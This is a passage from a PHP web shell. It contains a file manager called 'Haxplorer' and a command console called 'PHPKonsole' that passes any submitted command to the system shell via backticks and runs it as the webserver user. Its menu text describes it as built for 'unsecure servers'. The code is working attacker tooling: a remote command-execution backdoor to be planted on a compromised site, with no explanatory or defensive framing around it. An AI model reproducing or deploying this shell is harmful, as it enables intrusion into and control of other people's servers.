 				echo "Error: The $objident does already exist...<br><br>\"$olddir$newfile\"<br><br>Hit your browser's back to try again...";

 			}

 			else {

 				echo "Error: Can't copy the file, the file could be in use or you don't have permission to rename it.";

 			}

  		}

 		echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form></center>" ;

 	}

 	else {

 		$dpos = strrpos($oldfile, "/");

 		if (strval($dpos)!="") {

 			$olddir = substr($oldfile, 0, $dpos+1);

   		}

 		else {

 			$olddir = "$lastdir/";

		}

 		$fpos = strrpos($oldfile, "/");

 		if (strval($fpos)!="") {

 			$inputfile = substr($oldfile, $fpos+1);

   		}

 		else {

	 		$inputfile = "";

 		}

       		echo "<center><table><tr><td><form action=\"$SFileName?$urlAdd\" method=\"post\">\n";

 		echo "<input type=\"hidden\" name=\"cmd\" value=\"ren\">\n";

 		echo "<input type=\"hidden\" name=\"oldfile\" value=\"$oldfile\">\n";

 		echo "<input type=\"hidden\" name=\"olddir\" value=\"$olddir\">\n";

 		echo "<input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">\n";

 		echo "<input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">\n";

 		echo "Rename \"$oldfile\" to:<br>\n";

 		echo "<input size=\"100\" type=\"text\" name=\"newfile\" value=\"$inputfile\"><br><input type=\"submit\" value=\"Rename\">"; 

		echo "</form><form action=\"$SFileName?$urlAdd\" method=\"post\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input type=\"submit\" value=\"Cancel\"></form>";

 		echo "</td></tr></table></center>";

 	}

}

else if ( $cmd == "con") {



?>

<center>

<table>

 <tr><td>

<h3>PHPKonsole</h3>



<?php



if (ini_get('register_globals') != '1') {

    if (!empty($HTTP_POST_VARS))

	extract($HTTP_POST_VARS);

	  

    if (!empty($HTTP_GET_VARS))

	extract($HTTP_GET_VARS);

	      

    if (!empty($HTTP_SERVER_VARS))

	extract($HTTP_SERVER_VARS);

    }

		    

    if (!empty($work_dir)) {

	if (!empty($command)) {

	    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {

	        if ($regs[1][0] == '/') {

	            $new_dir = $regs[1];

		} else {

		    $new_dir = $work_dir . '/' . $regs[1];

		}

		if (file_exists($new_dir) && is_dir($new_dir)) {

		    $work_dir = $new_dir;

		}

		unset($command);

	    }

	}

    }

    if (file_exists($work_dir) && is_dir($work_dir)) {

	chdir($work_dir);

    }

    $work_dir = exec('pwd');

?>



    <form name="myform" action="<?php echo "$PHP_SELF?$urlAdd" ?>" method="post">

	<table border=0 cellspacing=0 cellpadding=0 width="100%"><tr><td>Current working directory: <b>

	<input type="hidden" name="cmd" value="con">

	<?php

	    $work_dir_splitted = explode('/', substr($work_dir, 1));

	    printf('<a href="%s?$urlAddcmd=con&stderr=%s&work_dir=/">Root</a>/', $PHP_SELF, $stderr);

	    if (!empty($work_dir_splitted[0])) {

		$path = '';

		for ($i = 0; $i < count($work_dir_splitted); $i++) {

		    $path .= '/' . $work_dir_splitted[$i];

		    printf('<a href="%s?$urlAddcmd=con&stderr=%s&work_dir=%s">%s</a>/', $PHP_SELF, $stderr, urlencode($path), $work_dir_splitted[$i]);

		}

	    }

	?></b></td>

	<td align="right">Choose new working directory: <select class="inputtext" name="work_dir" onChange="this.form.submit()">

	

	<?php

	$dir_handle = opendir($work_dir);

	while ($dir = readdir($dir_handle)) {

	    if (is_dir($dir)) {

		if ($dir == '.') {

		    echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";

		} elseif ($dir == '..') {

		    if (strlen($work_dir) == 1) {

		    }

		    elseif (strrpos($work_dir, '/') == 0) {

			echo "<option value=\"/\">Parent Directory</option>\n";

		    } else {

			echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";

		    }

		} else {

		    if ($work_dir == '/') {

			echo "<option value=\"$work_dir$dir\">$dir</option>\n";

		    } else {

			echo "<option value=\"$work_dir/$dir\">$dir</option>\n";

		    }

		}

	    }

	}

	closedir($dir_handle);

	?>

	</select></td></tr></table>

	<p>Command: <input class="inputtext" type="text" name="command" size="60">

	<input name="submit_btn" class="inputbutton" type="submit" value="Execute Command"></p>

	<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"<?php if (($stderr) || (!isset($stderr)) ) echo " CHECKED"; ?>></p>

	<textarea cols="80" rows="19" class="inputtextarea" wrap=off readonly><?php

	    if (!empty($command)) {

	        echo "phpKonsole> ". htmlspecialchars($command) . "\n\n"; 

		if ($stderr) {

		    $tmpfile = tempnam('/tmp', 'phpshell');

		    $command .= " 1> $tmpfile 2>&1; " . "cat $tmpfile; rm $tmpfile";

		} else if ($command == 'ls') {

		    $command .= ' -F';

		}

		$output = `$command`;

		echo htmlspecialchars($output);

	    }

	?></textarea>

    </form>

																													      

    <script language="JavaScript" type="text/javascript">

	document.forms[0].command.focus();

    </script>

 </td></tr></table>

<?php

}    

else { /* <!-- There is a incorrect or no parameter specified... Let's open the main menu --> */

	$isMainMenu = true;

     ?>

	<table width="100%" border="0" cellpadding="0" cellspacing="0">

	 <tr>

	  <td width="100%" class="border">

	   <center>&nbsp;.:: <?php echo $scriptTitle ?> Main Menu ::.&nbsp;</center>

	  </td>

	 </tr>

	</table>

	<br>

 	<center>

	<table border="0" NOWRAP>

 	 <tr>

	  <td valign="top" class="silver border">

           <?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> Haxplorer <==</strong></font>", "cmd=dir&dir=.").sp(2); ?>

	  </td>

 	  <td style="BORDER-TOP: silver 1px solid;" width=350 NOWRAP>

	   Haxplorer is a server side file browser wich (ab)uses the directory object to list

 	   the files and directories stored on a webserver. This handy tools allows you to manage

 	   files and directories on a unsecure server with php support.<br><br>This entire script

 	   is coded for unsecure servers, if your server is secured the script will hide commands

 	   or will even return errors to your browser...<br><br>

	  </td>

	 </tr>

 	 <tr>

	  <td valign="top" class="silver border">

           <?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> PHPKonsole <==</strong></font>", "cmd=con").sp(2); ?>

	  </td>

 	  <td style="BORDER-TOP: silver 1px solid;" width=350 NOWRAP>

	   <br>PHPKonsole is just a little telnet like shell wich allows you to run commands on the webserver.

	    When you run commands they will run as the webservers UserID. This should work perfectly

	    for managing files, like moving, copying etc. If you're using a linux server, system commands

	    such as ls, mv and cp will be available for you... <br><br>This function will only work if the

	    server supports php and the execute commands...<br><br>

	  </td>

	 </tr>

        </table>

	</center>

	<br>

     <?php

}



if ($cmd != "downl") {

	if ( $isMainMenu != true) {

 		?>

		<table width="100%" border="0" cellpadding="0" cellspacing="0">

		 <tr>

		  <td width="100%" style="class="silver border">

		   <center><strong>

		    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;Main Menu&nbsp;]  </font>", "cmd=&dir=");      ?>&nbsp;&nbsp;

		    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;PHPKonsole&nbsp;] </font>", "cmd=con");        ?>&nbsp;&nbsp;

                    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;Haxplorer&nbsp;]  </font>", "cmd=dir&dir=.");  ?> &nbsp;&nbsp;

 		   </strong></center>

		  </td>

		 </tr>

		</table>

		<br>

		<?php

}

	?>

	<table width=100% border="0" cellpadding="0" cellspacing="0">

	 <tr>

	  <td width="100%" class="silver border">

	   <center>&nbsp;<?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp;</center>

	  </td>

	 </tr>

	</table>

 	   </td>

  </tr>

 </table>



  <?php

 }



?> 







